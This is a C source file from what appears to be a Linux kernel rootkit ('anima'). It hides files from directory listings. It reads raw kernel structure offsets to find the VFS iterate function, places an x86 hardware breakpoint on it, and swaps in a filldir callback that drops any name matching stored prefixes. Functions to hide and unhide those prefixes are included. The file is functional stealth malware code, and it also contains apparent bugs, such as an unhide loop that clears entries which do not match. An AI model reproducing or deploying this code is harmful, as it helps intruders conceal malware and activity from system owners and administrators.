#include <anima/ksyms.h>
#include <anima/libc.h>
#define TMP_INCLUDE_DIRCTX
#include <anima/vfs.h>
#include <anima/x86.h>

#define MAX_HIDDEN_FILES 50
#define FILENAME_SIZE	 20

static char hidden_file[MAX_HIDDEN_FILES][FILENAME_SIZE] = { {0} };

static int is_name_hidden(const char *name)
{
	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
		unsigned int len = anima_strlen(hidden_file[i]);
		if (hidden_file[i][0] &&
		    !anima_strncmp(hidden_file[i], name, len)) {
			pr_debug("%s: hiding %s", __func__, name);
			return 1;
		}
	}

	return 0;
}

/*
 * for kernel versions >= 3.11
 */
static void *get_vfs_iterate(const char *path)
{
	/* FIXME: hackish function */
	char *filep, *f_op, *iterate;

	filep = ksyms.filp_open(path, 0, 0);
	if (!filep)
		return NULL;

	/* get filep->f_op */
	f_op = (void *)*(unsigned long *)(filep + 5 * sizeof(unsigned long));

	/* get filep->f_op->iterate */
	iterate = (char *)(*(unsigned long *)(f_op + 8*8));
	pr_debug("%s: iterate=%p", __func__, iterate);

	ksyms.filp_close(filep, 0);

	return iterate;
}
static filldir_t old_filldir;

static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	if (is_name_hidden(name)) {
		return 0;
	}

	return old_filldir(__buf, name, namlen, offset, ino, d_type);
}

static void vfs_iterate_hook(struct pt_regs *regs)
{
	struct dir_context *ctx = (void *)regs->si;

	/*
	 * FIXME: should disable preemption ?
	 * old_filldir can be set by multiple kernel path !!!
	 */
	old_filldir = ctx->actor;
	ctx->actor = new_filldir;
}

/*
 * VFS hook API
 */
int hide_filename_starting_with(const char *name, unsigned int len)
{
	pr_debug("%s: name=%s", __func__, name);

	len = len >= FILENAME_SIZE ? FILENAME_SIZE-1 : len;

	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
		if (!hidden_file[i][0]) {
			ksyms._copy_from_user(hidden_file[i], name, len);
			hidden_file[i][FILENAME_SIZE-1] = 0;
			return 0;
		}
	}

	return -1;
}

int unhide_filename_starting_with(const char *name, unsigned int len)
{
	char kname[FILENAME_SIZE];

	len = len >= FILENAME_SIZE ? FILENAME_SIZE-1 : len;
	if (ksyms._copy_from_user(kname, name, len))
		return -1;

	pr_debug("%s: name=%s", __func__, name);

	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
		if (anima_strncmp(hidden_file[i], kname, FILENAME_SIZE))
			hidden_file[i][0] = 0;

	return 0;
}

void hook_vfs(void)
{
	unsigned long root_iterate = (unsigned long)get_vfs_iterate("/");
	x86_hw_breakpoint_register(2, root_iterate, DR_RW_EXECUTE,
				   0, vfs_iterate_hook);
}
